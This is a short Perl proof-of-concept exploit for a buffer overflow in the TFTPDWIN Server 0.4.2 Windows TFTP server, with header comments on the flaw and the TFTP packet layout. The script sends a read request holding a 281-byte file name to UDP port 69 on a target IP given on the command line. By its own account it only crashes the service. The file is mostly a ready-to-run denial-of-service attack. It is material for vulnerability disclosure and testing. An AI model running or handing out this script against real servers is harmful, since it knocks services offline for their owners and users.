#-------------------------------------------------------------------------------
#                            TFTPDWIN Server Long File Name BO 0.4.2 POC 
#			            written By : Umesh Wanve
#	
#-------------------------------------------------------------------------------

# TFTPDWIN Server is a Freeware TFTP server for Windows 9x/NT/XP.
# (http://www.tftpserver.prosysinfo.com.pl)
# A vulnerability has been identified in TFTP Server TFTPDWIN Server 
v0.4.2, which 
# could be exploited by remote or local attackers to execute arbitrary 
commands 
# or cause a denial of service. This flaw is due to a buffer overflow 
error when 
# handling an overly long file name (more than 280 bytes) passed to a 
"GET" or "PUT" 
# command, which could be exploited by malicious users to compromise a 
vulnerable 
# system or crash an affected application.
# EXPLOIT:
# Buffer Overflow (Long filename) Vulnerability Exploit
# This is just a DoS exploiting code
# Tested on Windows 2000 SP4

#TFTP PROTOCOL - packet
#Read Request(01) : "\x00\x01"
#Source File Name : file name
#Type : netascii : "\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"

#----------------------------Start of 
Code-------------------------------------

#!/usr/bin/perl

use IO::Socket;
use strict;

my($socket) = "";
my($header)="\x00\x01";
my($tailer)="\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00";


if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],

PeerPort => "69",



Proto    => "UDP"))
{
                 #\x00\x01\---aaaaa * 280 
-----\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00

                 print $socket $header.("A" x 281).$tailer;
                 sleep(1);
			
                 close($socket);
}
else
{
                 print "Cannot connect to $ARGV[0]:69\n";
}



